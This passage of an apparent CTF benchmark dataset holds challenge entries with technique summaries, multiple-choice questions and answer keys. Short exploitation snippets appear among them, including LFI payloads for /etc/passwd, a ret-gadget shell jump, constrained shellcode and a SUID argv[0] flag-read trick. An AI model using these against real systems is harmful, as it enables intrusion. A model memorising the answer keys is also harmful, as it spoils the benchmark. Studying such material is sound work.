            "When bypassing sandbox restrictions in a QEMU escape scenario with restricted command execution, which of the following strategies is NOT a valid step in a Return-Oriented Programming (ROP) chain to read and leak a file's content? - A. Leveraging a 'pop rdi' gadget to control the first argument to the 'open' syscall. - B. Executing a direct system call to execve(\"/bin/sh\") within the ROP chain. - C. Using a 'syscall' gadget to execute the 'open', 'read', and 'write' syscalls sequentially. - D. Employing 'xchg' gadgets to manipulate register values for syscalls. "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "fvm",
        "write_up": "dataset/raw/fvm.md",
        "type": "The type of this CTF challenge is **reverse**.",
        "competition": [
            "zer0pts/2023",
            "https://ctftime.org/event/1972/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "In reverse engineering challenges involving virtual machines (VMs) that use x87 floating-point operations, understanding the behavioral semantics of x87 instructions is crucial. Key operations such as conditional jumps, stack manipulations (push, pop, exchange), and arithmetic (add, sub, mul, div) are often represented differently in disassembled code. Tools like Ghidra might not accurately replicate the stack behavior or instruction effects in their decompiled view. Thus, referring to an authoritative source like the list of x86 and x87 instructions at https://www.felixcloutier.com/x86/ can aid in accurately interpreting what each VM instruction does, especially when the VM implements its own instruction set on top of x87 operations.",
            "For challenges that involve analyzing or cracking custom bytecode or VM instructions, writing a custom disassembler can greatly enhance understanding and facilitate automated analysis. This approach involves mapping each custom opcode to its functionality, which might include arithmetic operations, stack manipulations, conditional jumps, or special operations like reading from or jumping to positions based on stack values. A custom disassembler allows for a structured representation of the bytecode, making patterns more noticeable and debugging with tools like GDB more efficient. One can use Python for this task, utilizing its string manipulation and numerical capabilities to interpret byte sequences as opcodes and operands, converting them into a human-readable format or into comments that can be further analyzed either statically or dynamically with debuggers.\n   \n   Example of a disassembler output line transformation:\n   - Before: `0x01 0x56 0x89`\n   - After: `ADD R1, R2 // Adds contents of R2 to R1`"
        ],
        "question": [
            "In the context of reverse engineering challenges that utilize the x87 floating-point unit for virtual machine (VM) implementations, which of the following statements best describes the necessity when deciphering VM operations implemented with x87 instructions? - A. It's sufficient to rely solely on the decompiled view provided by reverse engineering tools for accurate operation translation. - B. You must cross-reference each operation with an official x87 instruction list due to potential misinterpretations in tool decompilations. - C. Direct assembly modification is the preferred and most accurate method for understanding x87-based VM instructions. - D. The behavior of x87 instructions is inherently intuitive and requires no additional reference beyond basic assembly knowledge.",
            "In challenges requiring the analysis of custom bytecode, especially in cases where virtual machine instructions perform complex operations using the stack, why is writing a custom disassembler beneficial? - A. Because it automates the entire reverse engineering process, making manual analysis unnecessary. - B. It simplifies the output of encryption algorithms used within the VM, translating them into plain text. - C. A custom disassembler enables the dynamic execution of bytecode, revealing hidden operations without analysis. - D. Mapping custom opcodes to their intended functionalities allows for a clearer understanding of the code, highlighting patterns and facilitating debugging."
        ],
        "answer": [
            "B",
            "D"
        ]
    },
    {
        "name": "Galleria 1",
        "write_up": "dataset/raw/Galleria 1.md",
        "type": "web",
        "competition": [
            "CSCML/2020",
            "https://ctftime.org/event/1071/tasks/"
        ],
        "score": 310,
        "max_score": 500,
        "difficulty": 0.62,
        "knowledge": [
            "When dealing with web applications that include file or directory fetching features, inspecting the AJAX requests can reveal potential vulnerabilities. Specifically, look for parameters that influence file paths, such as \"folder\" or \"file\" parameters. This can be exploited using path traversal techniques to access files outside the intended directory. For path traversal, use relative paths (e.g., \"../\" to move up a directory) in the parameter to navigate the server's file system. Example payload: `../` or `../../` to navigate up directories.",
            "If encountering PHP scripts that allow file content viewing through parameters, this can be exploited to read arbitrary files on the system assuming the web server has the necessary permissions. This is particularly dangerous if the script does not properly sanitize user input, allowing for Local File Inclusion (LFI) vulnerabilities. To exploit such vulnerabilities, craft the input to the vulnerable parameter to include the path to sensitive files (e.g., `/etc/passwd`, or in this case, the path to a flag file). Example payload: `?debug=TRUE&file=/path/to/sensitivefile.txt`"
        ],
        "question": [
            "During an examination of a web application's AJAX requests, a particular request was found to include a \"folder\" parameter that fetches directory contents. This setup could potentially be vulnerable to which kind of attack?  - A. SQL Injection - B. Cross-Site Scripting (XSS) - C. Path Traversal - D. Cross-Site Request Forgery (CSRF) ",
            "You come across a PHP script in a web application that allows viewing file contents via a query parameter. The script does not sanitize or restrict the files that can be accessed. This scenario is indicative of which type of vulnerability?  - A. Remote Code Execution (RCE) - B. Local File Inclusion (LFI) - C. Server-Side Request Forgery (SSRF) - D. Directory Traversal "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "gallery",
        "write_up": "dataset/raw/gallery.md",
        "type": "This write-up describes a forensics challenge where the participant had to recover a hidden flag from an EWF (Expert Witness) image file using steganography techniques and brute-forcing a password. The challenge involved examining the contents of the damaged disk to extract hidden information. Therefore, the type of this challenge is **forensics**.",
        "competition": [
            "CrewCTF/2023",
            "https://ctftime.org/event/2032/tasks/"
        ],
        "score": -1.0,
        "max_score": 957,
        "difficulty": -1,
        "knowledge": [
            "When dealing with EWF (Expert Witness Format) files in digital forensics CTF challenges, using ewf-tools can effectively mount the EWF file to a mount point for further analysis. This tool simplifies the process of accessing the contents of EWF files on systems like Kali Linux.",
            "In challenges involving steganography, particularly when suspecting hidden data within JPEG files and a password is required for extraction, leveraging tools like stegcracker in conjunction with a potential wordlist extracted from the challenge can be an effective method to brute-force the password and retrieve hidden data. Successful brute-forcing results in the extraction of the hidden file, revealing the flag or additional clues.\n\n   Example payload: `stegcracker Wallpaper_HD_19756487Ef4.jpg wordlist.txt`"
        ],
        "question": [
            "If you have an EWF file (Expert Witness Format) that needs to be analyzed during a digital forensics investigation, which command should you use to mount the EWF file for further examination on a Linux system?  - A. `sudo mount -o loop challenge.E01 /mnt` - B. `sudo ewfmount challenge.E01 /mnt` - C. `sudo ewfmount challenge.E01 rawimage/` - D. `sudo dd if=challenge.E01 of=/mnt` ",
            "During a digital forensics challenge, you suspect that a JPEG file named \"Wallpaper_HD_19756487Ef4.jpg\" contains hidden data that requires a password to extract. You have a wordlist \"wordlist.txt\" that you believe contains the password. Which tool and command should you use to brute-force the password and attempt to extract the hidden data?  - A. `sudo john Wallpaper_HD_19756487Ef4.jpg with wordlist.txt` - B. `sudo hydra -f Wallpaper_HD_19756487Ef4.jpg -x wordlist.txt` - C. `stegcracker Wallpaper_HD_19756487Ef4.jpg wordlist.txt` - D. `steghide extract -sf Wallpaper_HD_19756487Ef4.jpg -wl wordlist.txt` "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "Game Graphics Debugging",
        "write_up": "dataset/raw/Game Graphics Debugging.md",
        "type": "This write-up describes a reverse engineering challenge where the author had to debug the graphics of a game to find the hidden flag. Based on the details provided, the type of challenge is **reverse**.",
        "competition": [
            "WolvCTF/2024",
            "https://ctftime.org/event/2240/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "When a binary crashes due to a missing or incorrect version of a dynamic link library (DLL), especially in the context of graphics applications, attempt to diagnose and solve the issue by identifying the expected version of the DLL through debugging tools or log messages. Subsequently, download or acquire the correct version and place it in the application's directory to override the system's default DLL. This is based on the application's behavior of first checking its own directory for the required DLLs before consulting system-wide directories.",
            "In situations where obfuscation or unusual encoding prevents direct analysis through standard means, such as inspecting strings or dissecting entry points, investigate the binary's interaction with the operating system's and graphics API's threading and memory management mechanisms. Specifically, look for operations involving Thread Local Storage (TLS) as a tactic for hiding or manipulating data, such as flags, within secure or isolated memory spaces. This approach is particularly beneficial in reversing challenges involving graphical applications or games, where data might be obfuscated or stored in unconventional ways.\n\nExample of suspicious code hinting at flag manipulation using TLS and XOR operations:\n```cpp\nif (flag_arr[39])\n{\n  *flag_arr ^= 0x8Fu;\n  flag_arr[1] ^= 0xC7u;\n  // further XOR operations\n  flag_arr[39] = 0;\n}\n```"
        ],
        "question": [
            "When debugging an application that crashes due to the absence or incorrect version of a DLL, specifically related to graphics such as `vulkan-1.dll`, what is the first step in attempting to resolve the issue? - A. Reinstall the operating system to ensure all default libraries are up to date. - B. Modify the binary directly to remove the dependency on the missing DLL. - C. Place the correct version of the DLL in the application's directory to ensure it is used instead of the system's version. - D. Ignore the error and attempt to bypass the crash by modifying the application's code at runtime.",
            "In a challenge involving a stripped binary from a graphical application, where the standard reverse engineering methods fail to locate the flag, which technique could reveal the flag hidden within the application's memory through obfuscation mechanisms involving Thread Local Storage (TLS) and XOR operations? - A. Directly modifying the application's main function to print out all strings. - B. Using a generic string search tool on the binary without considering encoding issues. - C. Setting breakpoints around graphics API calls that are suspected to manipulate the flag. - D. Inspecting the application's interaction with TLS and looking for obfuscated code blocks that perform XOR operations on data, suggesting manipulation or hiding of the flag."
        ],
        "answer": [
            "C",
            "D"
        ]
    },
    {
        "name": "gelcode",
        "write_up": "dataset/raw/gelcode.md",
        "type": "pwn",
        "competition": [
            "HSCTF/2021",
            "https://ctftime.org/event/1264/tasks/"
        ],
        "score": 490,
        "max_score": 493,
        "difficulty": 0.9939148073022313,
        "knowledge": [
            "When faced with a shellcode challenge that restricts code to a specific subset (e.g., byte values from `0x00` to `0x0f`), it is possible to construct arbitrary instruction codes using only the allowed instructions by carefully manipulating registers and memory. This is achieved by performing operations that alter register values and memory contents in ways that result in the desired code execution. For example, incrementing the `rax` register by `0x01` and then writing to a memory location pointed to by `rdx + rax` to insert byte values that form valid instructions not directly writable due to the restrictions.",
            "In scenarios where direct execution of certain instructions is not possible due to input restrictions, one can leverage the properties of allowed operations (such as `add` and `or`) and the programmable control over register values and memory locations to indirectly create and execute a more complex shellcode. This involves setting up initial register states, incrementing specific register values, and using those registers as pointers or offsets to modify memory contents in a way that sequentially constructs the final intended executable code in memory. Example approach: Starting by setting a register to zero using `xor` with itself if possible, then using `add` instructions to increment a register or memory content byte by byte to the desired value, and strategically placing bytes in memory to form a functional shellcode sequence.\n   \nExample payload snippet:\n```asm\n# Assuming rdx points to writable memory and we can manipulate rax and rcx registers\nadd al, 0x01  # Increase AL by 1\nadd BYTE PTR [rdx+rax*1], al  # Write incremented value to [rdx+rax]\nadd cl, byte PTR [rdx]  # Use contents at rdx to increment cl\n```"
        ],
        "question": [
            "In a shellcode challenge where only byte values from `0x00` to `0x0f` are allowed, which of the following methods can be used to construct arbitrary instruction codes by manipulating registers and memory without directly writing disallowed byte values? - A. Using the `sub` instruction to decrement register values and directly write to memory locations. - B. Leveraging the `add` and `or` instructions to indirectly write bytes to memory that form the desired opcode and operands. - C. Employing a straightforward `mov` instruction sequence to directly place the required shellcode in memory. - D. Applying the `xor` instruction between unrelated registers to generate arbitrary values and copying them to memory.",
            "When direct execution of specific shellcode instructions is restricted, what technique can be employed to generate and execute complex instructions using only permitted operations? - A. Utilize `div` and `mul` instructions to generate specific numbers in registers that can be used to write shellcode to memory. - B. Directly write the shellcode into memory using `mov` instructions and jump to its location. - C. Set up initial register states and use `add` and `or` instructions to modify memory content, forming an executable shellcode sequence indirectly. - D. Focus exclusively on arithmetic operations like `add` on the stack pointer to manipulate return addresses directly."
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Generic Flag Checker 1",
        "write_up": "dataset/raw/Generic Flag Checker 1.md",
        "type": "reverse",
        "competition": [
            "NACTF/2020",
            "https://ctftime.org/event/1157/tasks/"
        ],
        "score": 75,
        "max_score": 800,
        "difficulty": 0.09375,
        "knowledge": [
            "When dealing with ELF (Executable and Linkable Format) files in reverse engineering challenges, static analysis is a foundational approach that involves examining the binary without executing it. Tools like `strings` can reveal embedded strings such as a flag or hints towards its location. This method is particularly effective for small to medium-sized binaries and can sometimes directly reveal the flag if not sufficiently obfuscated or hidden.\n   - Example command: `strings gfc1 | grep -i flag`",
            "For more complex ELF binaries where static analysis with basic tools does not yield results, using advanced software reverse engineering tools like Ghidra is recommended. Ghidra facilitates a deeper static analysis, providing a disassembled view of the executable, decompiler output, and various analyses that aid in understanding the binary's functionality. This is particularly useful for binaries that incorporate more complex logic for the flag-checking mechanism.\n   - Tip: No specific payload, but the approach would typically involve loading the ELF file into Ghidra, using the decompiler to understand the checking mechanism, and then crafting an input or exploiting a vulnerability accordingly."
        ],
        "question": [
            "When performing static analysis on an ELF file without executing it, which command could directly reveal embedded strings such as flags within the file? - A. `gcc gfc1 -o output` - B. `strings gfc1` - C. `chmod +x gfc1` - D. `gdb gfc1`",
            "When basic tools like `strings` do not suffice for analyzing complex ELF binaries, which tool is recommended for a deeper static analysis that includes disassembling and decompiling the executable? - A. Visual Studio - B. WinRAR - C. Notepad++ - D. Ghidra"
        ],
        "answer": [
            "B",
            "D"
        ]
    },
    {
        "name": "Generic Flag Checker 2",
        "write_up": "dataset/raw/Generic Flag Checker 2.md",
        "type": "reverse",
        "competition": [
            "NACTF/2020",
            "https://ctftime.org/event/1157/tasks/"
        ],
        "score": 150,
        "max_score": 800,
        "difficulty": 0.1875,
        "knowledge": [
            "When static analysis of a binary or executable file does not reveal the flag or its mechanism, dynamic analysis is the next viable step. Tools such as \"strace\" for tracing system calls and \"ltrace\" for tracing library calls can be instrumental. The choice between \"strace\" and \"ltrace\" depends on whether the interest lies in the system calls made by the program or the library calls. In scenarios where the executable is interacting with library functions, \"ltrace\" should be considered for capturing the flag-checking logic or any other relevant interactions that could lead to the discovery of the flag.",
            "For capturing complete outputs or strings that exceed the default limit in tools like \"ltrace\", the \"-s\" parameter can be used. This parameter allows the user to specify the maximum string size to print, which is crucial for capturing entire flags or long strings that are part of the executable's output or debugging information. For example, running \"ltrace -s 123 ./executable\" would adjust the string limit to 123 characters, ensuring that longer outputs are not truncated, aiding in the complete capture of the flag or the debugging information needed for solving challenges.\n   - Example command to ensure full output: `ltrace -s 123 ./gfc2`"
        ],
        "question": [
            "When conducting dynamic analysis of an executable that primarily interacts with library functions, which tool is more appropriate to use for tracing these interactions?  - A. gcc - B. gdb - C. ltrace - D. strace ",
            "In a scenario where the output or strings captured by \"ltrace\" are truncated, which command correctly adjusts the maximum string size to ensure complete capture of the flag or essential debugging information?  - A. `ltrace --string-size=123 ./executable` - B. `ltrace -s 123 ./executable` - C. `ltrace -max-str-len 123 ./executable` - D. `ltrace --set-string-limit=123 ./executable` "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "geoguesser",
        "write_up": "dataset/raw/geoguesser.md",
        "type": "pwn",
        "competition": [
            "UIUCTF/2023",
            "https://ctftime.org/event/1899/tasks/"
        ],
        "score": -1,
        "max_score": 50,
        "difficulty": -1,
        "knowledge": [
            "When dealing with challenges that involve random number generation (RNG) where the RNG is seeded with a predictable value such as the current time, it is possible to replicate the RNG output by creating a custom script that uses the same seed. This can be particularly useful in scenarios where guessing the correct input depends on predicting the output of the RNG. For instance, in a geoguesser game where coordinates are randomly generated, synchronizing the RNG seed (e.g., current time) between the attacker's script and the challenge can predict the coordinates.\n   - Example script snippet: \n     ```janet\n     (let [t (math/rng (os/time))]  \n       (printf \"%.4f,%.4f\"  \n         (+ -90 (* 180 (math/rng-uniform t)))  \n         (+ -180 (* 360 (math/rng-uniform t)))))\n     ```",
            "When automating the interaction with a challenge that requires input based on the output of a custom script, it is advantageous to use a script automation tool or library like pwntools. This is particularly relevant when the script needs to interact with a remote service and where the timing of sending payloads can affect the outcome of the challenge. Adjusting the timing and the order of operations in your script can be crucial for success.\n   - Example pwntools script snippet:\n     ```python\n     #!/usr/bin/env python3\n     from pwn import *\n     target = remote(\"geoguesser.chal.uiuc.tf\", 1337)\n     val = subprocess.check_output(['janet', 'main.janet'])\n     print(target.recvline())\n     target.sendline(val)\n     print(target.recvline())\n     ```\n     Note: In this example, `subprocess.check_output(['janet', 'main.janet'])` is used to execute the janet script and generate the payload based on the current time-seeded random number generator. Then, `target.sendline(val)` is used to send this payload to the challenge server."
        ],
        "question": [
            "In a Capture the Flag (CTF) scenario, where the goal is to predict the output of a Random Number Generator (RNG) used in a game, and knowing the RNG is seeded with the current time, which of the following best reflects the method to replicate the RNG output? - A. Using the mathematical average of possible RNG outputs to predict the next output. - B. Hardcoding specific RNG outputs in the script based on historical data. - C. Seeding your custom script with the exact same value that the challenge is expected to use (e.g., the current time) to generate a predictable output. - D. Manually guessing the RNG output by repeatedly interacting with the game service. ",
            "When automating interactions with a remote CTF challenge using a script and the challenge requires inputs generated from a script based on the RNG seeded with the current time, which scripting tool or library is indicated for sending these generated inputs to the remote service effectively? - A. Selenium WebDriver for automating web browser interaction. - B. A custom TCP socket script written from scratch for low-level network communication. - C. Pwntools for automating sending and receiving data to/from a remote service in CTF challenges. - D. Using the HTTP client library requests for web-based challenges. "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "getstat",
        "write_up": "dataset/raw/getstat.md",
        "type": "pwn",
        "competition": [
            "CyberSecurityRumble/2021",
            "https://ctftime.org/event/1429/tasks/"
        ],
        "score": 365,
        "max_score": 760,
        "difficulty": 0.48026315789473684,
        "knowledge": [
            "When working on challenges that involve buffer overflows with binaries that accept numeric input, consider the potential for stack smashing by providing input in an unexpected format or size. Specifically, entering a negative size for an array or data series, then providing enough data points can lead to a stack smashing condition that may be exploited to overwrite the return address and execute arbitrary code:\n   - To exploit such vulnerabilities, one must understand the memory layout, specifically the offset between the input pointer and the return address. This understanding can then be applied to carefully craft inputs that manipulate the stack to overwrite the return address with a desired payload or address.\n   - Example scenario: When the binary expects a series of numerical inputs to calculate statistics (like average and variance), and does not properly validate the size of the input series, leading to potential buffer overflow.",
            "In scenarios where direct execution of shellcode or jumping to a function requiring specific stack alignment (such as a `system(\"sh\")` call that expects a 16-byte stack alignment) through a buffer overflow exploit fails due to incorrect stack alignment, leverage a 'ret gadget' to adjust the stack before jumping to the target function:\n   - A 'ret gadget' is essentially an existing piece of code within the vulnerable binary, often a simple 'ret' instruction at a known address, which when jumped to, adjusts the stack by popping off values before transferring control to the intended function or shellcode.\n   - This method ensures proper stack alignment when exploiting buffer overflow vulnerabilities in binaries, specifically when the exploit requires jumping to a shell function or similar payloads where stack alignment is crucial for successful execution.\n   - Example payload for adjusting stack alignment before jumping to a shell function: jump to `ret` instruction address to fix stack alignment, then jump to shell function address.\n     ```\n     def iToF(i):\n         b = struct.pack('q', i)\n         return struct.unpack('d', b)[0]\n\n     ret = 0x4013e4  # Address of ret instruction for stack alignment\n     addr = 0x401360  # Address of shell function\n     \n     # Craft payload with adjusted stack alignment\n     payload = [iToF(ret), iToF(addr)]\n     ```"
        ],
        "question": [
            "When exploiting a buffer overflow in a binary that accepts numerical input to perform calculations, if a negative size can be input leading to a condition that allows for the stack to be smashed and the return address overwritten, what must an attacker understand to craft a working exploit? - A. The color of the binary's icon in the filesystem. - B. The exact version of the compiler used to build the binary. - C. The price of the server hosting the binary. - D. The offset between the input pointer and the return address in the binary's memory layout.",
            "In exploiting buffer overflow vulnerabilities where a direct jump to a function (e.g., a shell function) fails due to incorrect stack alignment, what can be used to adjust the stack before executing the target function? - A. Redirecting the execution flow to write data to a log file. - B. Using a 'ret gadget' to adjust the stack by popping off values before transferring control. - C. Increasing the size of the input to automatically adjust the stack alignment. - D. Changing the binary\u2019s compilation flags to ignore stack alignment."
        ],
        "answer": [
            "D",
            "B"
        ]
    },
    {
        "name": "gg no re 50",
        "write_up": "dataset/raw/gg no re 50.md",
        "type": "web",
        "competition": [
            "AUCTF/2020",
            "https://ctftime.org/event/1020/tasks/"
        ],
        "score": -1,
        "max_score": 1000,
        "difficulty": -1,
        "knowledge": [
            "When encountering obfuscated JavaScript code within a challenge, identifying and decoding embedded Base64 strings can reveal hidden paths or instructions essential for progression. Embedded strings should be decoded using online tools or programming functions to uncover these paths. For example, decoding a Base64 string might reveal an instruction such as \"Make a GET request to /hidden/nextstep.php\".",
            "Inspecting the network activity and response headers in the developer tools of a web browser can reveal additional clues or steps to follow in web-based challenges. This may include custom headers with encoded messages or instructions that need to be decoded or interpreted correctly. For instance, a response header `ROT13: Znxr n CBFG erdhrfg gb /ncv/svany.cuc` decoded from ROT13 reveals the next step: \"Make a POST request to /api/final.php\"."
        ],
        "question": [
            "In a cybersecurity challenge, if you encounter a JavaScript file with obfuscated code, and you identify a potential Base64 encoded string, what would be your next step to uncover hidden instructions? - A. Execute the JavaScript in a browser and observe console errors. - B. Use an online tool or a programming function to decode the Base64 string to discover instructions. - C. Ignore the string as it's likely irrelevant to progressing in the challenge. - D. Delete the string and check if the website behavior changes. ",
            "When solving a web challenge and after making a GET request, if you find nothing immediately useful on the page but notice an unusual response header `ROT13: Znxr n CBFG erdhrfg gb /ncv/svany.cuc`, what should you do next? - A. Submit a POST request to the same URL without any modifications. - B. Ignore the header as it's a common method to mislead participants. - C. Decode the header value from ROT13 to reveal a hidden instruction such as making a POST request to a specific endpoint. - D. Search online for the significance of ROT13 encoded headers in web development. "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "gipfel",
        "write_up": "dataset/raw/gipfel.md",
        "type": "crypto",
        "competition": [
            "HXP/2021",
            "https://ctftime.org/event/1447/tasks/"
        ],
        "score": 85,
        "max_score": 1000,
        "difficulty": 0.085,
        "knowledge": [
            "When engaging in cryptographic challenges where the goal is to influence or predict shared secrets in key exchange protocols, selecting specific inputs that exploit the mathematical properties of the underlying cryptographic operations can lead to predictable outcomes. Specifically, choosing a value such that \\(B = q - 1 \\equiv -1 \\mod q\\), when \\(q\\) is a prime number used in the modulus operation, forces any exponentiation involving \\(B\\) to result in a predictable outcome due to Fermat's Little Theorem. This method can be particularly effective in scenarios where the challenge involves manipulating shared secrets or session keys within Diffie-Hellman-like key exchange mechanisms.",
            "For challenges related to breaking encrypted communication where the encryption key is derived from a bruteforceable parameter (like a low-entropy password), iterating through the possible range of this parameter to derive potential keys, and then attempting decryption of a captured encrypted message can lead to the recovery of plaintext. This method is applicable in scenarios where the key derivation process is known, and the key space is sufficiently small to allow for practical enumeration. Utilizing efficient programming libraries for cryptographic operations and iterating with optimizations (e.g., avoiding recomputation of static values, using fast decryption routines) significantly enhances the feasibility of this attack vector. \n\nExample payload for the decryption loop:\n```py\nfrom Crypto.Hash import SHA256\nfrom Crypto.Cipher import AES\nfrom tqdm import tqdm\n\nflag_encrypted = \"8cc14560e62654903a42eb6b9d95d24ea7bb2a63a394cabfedbd61e2450b9555164fcf30c1f0f8ba\"\n\nfor password in tqdm(range(10 ** 6)):  \n   g = int(SHA256.new(str(password).encode()).hexdigest(), 16)\n   key = SHA256.new(b'\\0'.join([str(password).encode(), b'1'])).digest()\n   aes = AES.new(key, AES.MODE_CTR, nonce=b\"\")\n   try:\n       plaintext = aes.decrypt(bytes.fromhex(flag_encrypted))\n       if plaintext.startswith(b\"hxp{\"):\n           print(f\"Found password: {password}\")\n           print(f\"Plaintext: {plaintext.decode()}\")\n           break\n   except Exception as e:\n       continue\n```"
        ],
        "question": [
            "In a cryptographic challenge, a participant selects \\(B = q - 1\\) as their submitted value for a Diffie-Hellman-like key exchange in a scenario where \\(q\\) is a prime number used as the modulus. What is the mathematical justification for selecting \\(B = q - 1\\) to influence the outcome of the operation \\(B^a \\mod q\\)? - A. It guarantees that \\(B^a \\mod q = 1\\) for any value of \\(a\\) due to the Base-Negative-One Exponentiation Theorem. - B. It ensures that \\(B^a \\mod q = 0\\) for any non-zero value of \\(a\\), by the definition of modular arithmetic. - C. It ensures that \\(B^a \\mod q = q-1\\) for all values of \\(a\\), which is a property of the modulus operation. - D. It guarantees that \\(B^a \\mod q = 1\\) for any even value of \\(a\\), due to Fermat's Little Theorem. ",
            "In a scenario where the encryption key must be derived from a numeric password through brute force, to decrypt an AES-CTR encrypted message, which step is crucial for the successful decryption of the message given the approach involves iterating through a range of possible passwords? - A. Ensuring the nonce used in the AES-CTR decryption process is set to the password's integer value to guarantee key uniqueness. - B. Confirming the encrypted message is encoded in Base64 format before attempting decryption to enhance the comparability of the output. - C. Utilizing a secure hash (SHA256) to derive the encryption key from each password attempt, then attempting to decrypt the message with each key until the plaintext is successfully recovered. - D. Applying a public key derived from the password to decrypt the message directly, circumventing the AES encryption algorithm's security features. "
        ],
        "answer": [
            "D",
            "C"
        ]
    },
    {
        "name": "Glacier Military Daemon",
        "write_up": "dataset/raw/Glacier Military Daemon.md",
        "type": "This is a **pwn** challenge.",
        "competition": [
            "Glacier/2023",
            "https://ctftime.org/event/1992/tasks/"
        ],
        "score": 428,
        "max_score": 428,
        "difficulty": 1.0,
        "knowledge": [
            "When dealing with SUID binaries that use command-line arguments for execution control, modifying `argv[0]` through the use of the `-a` option with `exec` in bash can manipulate the executed binary's behavior. This technique allows for the execution of a different binary than originally intended, leveraging the SUID permission set to escalate privileges or execute arbitrary commands. Condition: This approach is effective in scenarios where the binary relies on its arguments (particularly `argv[0]`) for determining its behavior, and it is executing in an environment such as bash that supports the `-a` option with `exec`.\n   \n   Sample payload: `exec -a /bin/cat 0 '1/../self/root/flag.txt' &`",
            "Systems with resource limits can be exploited by intentionally triggering these limits to cause a program to fail and possibly retry an operation with modified parameters or behaviors. In this scenario, using `ulimit -n` to set a low file descriptor limit can force a program to fail when it attempts to open a new file descriptor, such as making a new network connection. This method is particularly useful in exploiting retry mechanisms in programs to initiate unintended behavior.\n\n   Sample payload: `ulimit -n 7; echo foo > /dev/tcp/127.0.0.1/80`"
        ],
        "question": [
            "In a scenario where you have access to a SUID binary that executes another program based on its `argv[0]` value, which bash command option allows you to manipulate the execution to launch an arbitrary executable instead? - A. exec -c /bin/sh - B. exec -a /bin/cat - C. bash -x /bin/ls - D. sh -e /usr/bin/env",
            "When exploiting a system's resource limits to trigger a failure in a daemon that has retry logic, which bash command can be used to intentionally limit the number of file descriptors available to the daemon, inducing a failure when it attempts to open a new connection? - A. export MAX_FD=5 - B. set -n 4 - C. ulimit -n 7 - D. limit -f 3"
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "GlacierVault",
        "write_up": "dataset/raw/GlacierVault.md",
        "type": "This write-up describes a **pwn** challenge. \n\nExplanation:\n- The write-up mentions the existence of two Solidity contracts, a proxy contract, and an implementation contract. \n- It then describes a weakness in the proxy contract that allows for write access to the same storage slot used to determine the owner of the proxy contract.\n- The provided exploit code shows manipulation of the storage slot to change the owner of the proxy contract and put the contract to sleep.\n\nTherefore, based on the information provided, this challenge falls under the **pwn** category.",
        "competition": [
            "Glacier/2023",
            "https://ctftime.org/event/1992/tasks/"
        ],
        "score": -1,
        "max_score": 428,
        "difficulty": -1,
        "knowledge": [
            "In solidity smart contracts, when a proxy contract and an implementation contract share the same storage layout, it is crucial to manage the storage carefully to prevent unauthorized access or write operations. The exploit demonstrates that if both contracts share a storage slot and that storage slot corresponds to sensitive information (like ownership details), it can be manipulated by interacting with the implementation contract in a way that wasn't intended by the original proxy contract's logic. One can exploit this by writing to the shared storage slot directly through the implementation contract, effectively altering the state in the proxy contract without direct interaction.",
            "The exploit also shows the importance of understanding the delegation of calls in proxy patterns within solidity contracts. If the proxy delegates calls to an implementation contract, and that implementation contract contains functions that can alter important state variables due to shared storage slots, these functions can be abused to change the state in ways unintended by the developers. This is particularly critical if the implementation contract has functions that do not properly check the caller's permissions, as demonstrated where an unauthorized address could change the owner by directly writing to the storage slot through the implementation contract's function."
        ],
        "question": [
            "In a scenario involving Solidity smart contracts with a proxy and an implementation contract sharing the same storage layout, which practice is critical to prevent unauthorized access or write operations to shared storage slots that correspond to sensitive information (like ownership details)?  - A. Utilize different storage layouts for the proxy and implementation contracts to ensure isolation. - B. Carefully manage the storage layout to prevent unauthorized access or write operations by explicitly defining access controls. - C. Always interact with the storage through high-level Solidity functions that automatically handle storage details. - D. Enable Solidity's built-in storage protection feature that prevents direct writes to storage slots by unauthorized contracts. ",
            "In the context of Solidity contracts using a proxy pattern, why is it important to understand the delegation of calls within this pattern, particularly when implementation contracts share storage slots with the proxy?  - A. To ensure that functions in the implementation contract that alter state variables cannot be accessed directly to avoid unnecessary gas costs. - B. To leverage the automatic storage compression feature provided by Solidity, which optimizes gas usage for state changes. - C. To prevent functions in the implementation contract from being called externally, as all function calls should be routed through a centralized router for logging purposes. - D. To avoid unintended state changes in the proxy contract caused by unauthorized access, especially if the implementation contract's functions that alter state variables do not properly check the caller's permissions. "
        ],
        "answer": [
            "B",
            "D"
        ]
    },
    {
        "name": "Golden Antelope",
        "write_up": "dataset/raw/Golden Antelope.md",
        "type": "crypto",
        "competition": [
            "VolgaCTF/2018/Quals",
            "https://ctftime.org/event/539/tasks/"
        ],
        "score": 350,
        "max_score": 500,
        "difficulty": 0.7,
        "knowledge": [
            "In challenges involving predicting pseudo-random number generator (PRNG) sequences, if the server provides partial outputs from the PRNG, you can reconstruct the PRNG state by reversing the operations or inferring the state transitions. This is especially feasible if you know the algorithm and can observe the output's transformation or the state's evolution over time. For instance, knowing how the last number is derived as a function of the internal state (e.g., using the last 8 bits of state, reversed, and converted to an integer) can help in back-calculating to estimate the state of the generator at a previous step.",
            "In cryptography challenges that involve modular arithmetic and sequences generated by operations on bit sequences, such as left shifts and bitwise AND operations with known patterns, you can use a brute-force approach combined with filtering based on provided outputs to narrow down possible initial states or key material. This entails enumerating possible values that satisfy given conditions (for example, initial outputs or a specific transformation result) and iteratively applying constraints or additional information (like subsequent output values) to refine guesses toward the accurate solution. This method can progressively eliminate incorrect states or keys, converging on the correct ones by validating against a known sequence of outputs."
        ],
        "question": [
